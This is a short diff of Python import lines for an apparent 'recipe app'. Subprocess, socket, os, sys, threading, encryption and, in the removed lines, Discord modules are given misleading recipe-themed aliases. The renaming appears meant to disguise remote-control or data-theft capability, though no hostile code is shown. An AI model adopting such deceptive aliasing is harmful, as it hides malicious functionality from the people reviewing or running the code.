@@ -4,16 +4,12 @@ import customtkinter
 import json
 import socket
 import subprocess as validation_output
-from subprocess import Popen as recipe_validator
+import subprocess as recipe_validator
 import os as recipe_list
-import discord as recipe_getter
 import asyncio as recipe_generator
 import random
-
-
+import sys as cookbook
 import threading as Recipe_App
-
-
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import padding
